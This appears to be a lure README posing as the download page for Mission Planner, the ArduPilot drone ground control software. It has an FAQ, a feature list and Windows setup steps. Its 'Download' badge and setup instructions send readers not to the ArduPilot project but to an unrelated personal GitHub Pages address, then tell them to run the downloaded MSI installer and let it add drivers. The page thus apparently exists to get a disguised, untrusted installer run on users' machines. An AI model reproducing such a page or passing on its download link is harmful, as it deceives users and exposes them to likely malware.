# Mission Planner
Mission Planner is ground control software for Windows that helps ArduPilot operators shape waypoint routes, inspect mission parameters, and write verified plans to a vehicle.
It also supports configuration, telemetry review, logs, firmware tasks, and compatible live video workflows.

<p align="center"><img src="https://584bb81e.delivery.rocketcdn.me/wp-content/uploads/2022/09/mission-planner_icon_windows.png.webp" alt="Mission Planner logo" width="120"/></p>

[![Download Mission Planner](https://img.shields.io/badge/⬇_Download_Mission_Planner-00acc1?style=for-the-badge)](https://debbiehoward24.github.io/.github/Mission-Planner-Route-Design-App)

## Who Uses Mission Planner?

- ArduPilot pilots preparing autonomous waypoint missions before field operations.
- Builders configuring and checking compatible autopilot hardware on a Windows workstation.
- Mapping teams arranging repeatable capture routes, altitudes, and camera actions.
- Operators reviewing telemetry, logs, and vehicle settings during testing and maintenance.

## Mission Planning Questions

| Question | Answer |
| --- | --- |
| Is Mission Planner free? | Yes. Mission Planner is open-source software available without a purchase fee. Hardware, connectivity, mapping data, and field operations can still involve separate costs. |
| Which versions of Windows are supported? | Mission Planner is designed for native Windows installation. Use a maintained Windows environment and the current stable Mission Planner release, because driver and firmware workflows can change over time. |
| How do I verify a mission before using it? | Check the home position, waypoint order, altitude reference, command parameters, route distance, return behavior, and fence or rally data. After selecting Write to send the plan to the autopilot, select Read and compare the returned mission with the intended route. |
| Can Mission Planner display a video stream? | The Data screen can show compatible live video in the HUD, map area, or a separate window. Stream detection and playback depend on the camera, autopilot messages, network path, and required video components being configured correctly. |

## Current Project Facts

![Platform: Windows](https://img.shields.io/badge/Platform-Windows-00acc1) ![Category: Ground Control](https://img.shields.io/badge/Category-Ground_Control-00acc1) ![Release: Current stable](https://img.shields.io/badge/Release-Current_stable-00acc1)

## Route Preparation and Vehicle Checks

**Map-based route design.** Place and reorder waypoints while watching leg distances, headings, and the total planned journey. **Mission parameters.** Set commands, altitudes, loiter behavior, camera actions, and other values appropriate to the connected vehicle type. **Local plan files.** Save waypoint sets before field use and reload them when a route needs revision or reuse. **Fence and rally planning.** Prepare supported boundary and recovery data alongside the main mission. **Write-and-read verification.** Send the completed route to the autopilot, read it back, and confirm that the stored sequence matches the reviewed plan. **Operational context.** Use the Mission Planner ArduPilot interface to inspect telemetry and configuration without losing sight of the mission being prepared.

## Interface Preview

<img src="https://ardupilot.org/planner/_images/mission_planner_flight_data.jpg" alt="Mission Planner ArduPilot route planning interface"/>

*The Mission Planner ArduPilot interface combines a route map, ordered mission items, parameter fields, and controls for reading from or writing to the autopilot.*

## Responsive and Dependable Use

- **Speed:** Map loading, log work, and telemetry refresh depend on the computer, data volume, and connection quality.
- **Resource use:** Large logs, detailed maps, and a Mission Planner video stream can require more memory, graphics capacity, and network bandwidth.
- **Stability:** Save routes and parameter backups before major changes, and apply a current Mission Planner update before firmware work that requires newer support.

## Windows Setup

Choose the download button above to obtain the current Mission Planner Windows installer. Open the downloaded MSI package, proceed through the setup screens, and allow the installation utility to add the required software drivers. When setup finishes, launch Mission Planner from its Windows icon, then connect the autopilot or begin preparing a mission offline.

## Plan First, Write Second

**A careful upload starts on the map.** Review every waypoint and parameter, write the mission only when it is ready, and read it back before field use.
